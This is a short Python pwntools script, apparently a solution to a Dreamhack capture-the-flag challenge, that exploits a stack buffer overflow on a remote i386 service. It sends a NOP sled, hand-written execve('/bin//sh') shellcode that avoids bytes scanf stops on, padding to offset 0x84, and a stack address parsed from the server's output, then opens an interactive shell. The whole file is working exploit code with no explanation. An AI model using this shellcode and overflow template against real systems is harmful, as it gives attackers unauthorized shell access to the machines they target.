#!/usr/bin/env python2

from pwn import *
import re
context.log_level = "debug"
context.update(arch="i386", os="linux")

HOST = "host1.dreamhack.games"
PORT = 15753

conn = remote(HOST, PORT)

payload = asm("nop") * 16
#payload += asm(shellcraft.sh()) <<< Don't use on scanf
payload += "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
payload += asm("nop")*(0x84 - len(payload))

regex = re.compile('0[xX][0-9a-fA-F]+')
addr = int(regex.search(conn.read().decode("utf-8")).group(), 16)

payload += p32(addr)

conn.sendline(payload)
conn.interactive()
